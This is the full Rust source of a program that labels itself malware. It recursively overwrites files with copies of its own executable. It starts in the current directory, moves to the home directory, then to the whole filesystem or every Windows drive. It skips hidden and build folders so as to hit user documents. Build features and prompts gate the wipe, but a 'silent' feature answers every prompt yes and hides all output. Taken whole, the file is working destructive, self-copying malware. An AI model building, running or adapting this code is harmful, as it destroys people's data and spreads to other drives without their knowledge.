fn myprint(thing: String) {
    if !cfg!(feature = "silent") {
        println!("{}", thing);
    }
}
fn yn(prompt: String) -> bool {
    if cfg!(feature = "silent") {
        return true;
    }
    use std::io::Write;
    let mut output = String::new();
    myprint(format!("{}", prompt));
    std::io::stdout().flush().unwrap();
    std::io::stdin().read_line(&mut output).unwrap();
    let output = output.trim();
    if output == String::from("y") || output == String::from("Y") {
        return true;
    }
    return false;
}
fn overwrite_tree(path: std::path::PathBuf) {
    //matches any path with a dot starting a name, eg. all files in .config and .local
    let check_dot = regex::Regex::new(r"(\/|\\)\.").unwrap();
    //skip python package directories
    let check_python = regex::Regex::new(r"(\/|\\)(site|dist)-packages(\/|\\)").unwrap();
    //skip all build directories
    let check_build = regex::Regex::new(r"(\/|\\)build(\/|\\)").unwrap();
    //skip Rust target directories, which can get quite large
    let check_target = regex::Regex::new(r"(\/|\\)target(\/|\\)").unwrap();
    //ignore Windows AppData to focus on overwriting the user's documents
    #[cfg(target_family = "windows")]
    let check_appdata = regex::Regex::new(r"AppData").unwrap();
    if check_dot.is_match(path.clone().into_os_string().to_str().unwrap()) {
        return;
    }
    if check_python.is_match(path.clone().into_os_string().to_str().unwrap()) {
        return;
    }
    if check_build.is_match(path.clone().into_os_string().to_str().unwrap()) {
        return;
    }
    if check_target.is_match(path.clone().into_os_string().to_str().unwrap()) {
        return;
    }
    #[cfg(target_family = "windows")]
    if check_appdata.is_match(path.clone().into_os_string().to_str().unwrap()) {
        return;
    }
    match std::fs::read_dir(path.clone()) {
        Ok(paths) => {
            for i in paths {
                match i {
                    Ok(thing) => {
                        overwrite_tree(thing.path());
                    }
                    Err(error) => {
                        myprint(format!("error: {:?}", error));
                    }
                }
            }
        }
        Err(_) => {overwrite(path);}
    }
}
fn overwrite(path: std::path::PathBuf) {
    myprint(format!("{:?}", path));
    if cfg!(feature = "dangerous") {
        myprint(format!("{:?}", std::fs::copy(std::env::current_exe().unwrap(), path)));
    } else {
        myprint(format!("enable `dangerous` feature to allow overwriting"));
    }
}
//do external storage first to spread before nuking C:\
#[cfg(target_family = "windows")]
const WINDOWS_ROOTS: [&str; 26] = ["D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\", "A:\\", "B:\\", "C:\\"];
fn main() {
    myprint(format!("copy of malware"));
    if cfg!(feature = "dangerous") {
        myprint(format!("`dangerous` feature enabled - will overwrite files!"));
    } else {
        myprint(format!("`dangerous` feature disabled - will not overwrite files"));
    }
    if cfg!(feature = "stage3") {
        myprint(format!("Stages 1-3 enabled"));
    } else if cfg!(feature = "stage2") {
        myprint(format!("Stages 1-2 enabled; 3 disabled"));
    } else if cfg!(feature = "stage1") {
        myprint(format!("Stage 1 enabled; 2-3 disabled"));
    } else {
        myprint(format!("Stages 1-3 disabled"));
    }
    if cfg!(feature = "stage1") {
        if yn("Begin Stage 1 [y/n]".to_string()) {
            overwrite_tree(std::env::current_dir().unwrap());
            if cfg!(feature = "stage2") {
                if yn("Begin Stage 2 [y/n]".to_string()) {
                    overwrite_tree(dirs::home_dir().unwrap());
                    if cfg!(feature = "stage3") {
                        if yn("Begin Stage 3 [y/n]".to_string()) {
                            #[cfg(target_family = "unix")]
                            overwrite_tree("/".into());
                            #[cfg(target_family = "windows")]
                            for i in WINDOWS_ROOTS {
                                overwrite_tree(i.into());
                            }
                            #[cfg(all(not(target_family = "unix"), not(target_family = "windows")))]
                            myprint(format!("You are very lucky."));
                        }
                    } else {
                        myprint(format!("Stage 3 disabled; exiting"));
                    }
                }
            } else {
                myprint(format!("Stage 2 disabled; exiting"));
            }
        }
    } else {
        myprint(format!("Stage 1 disabled; exiting"));
    }
}
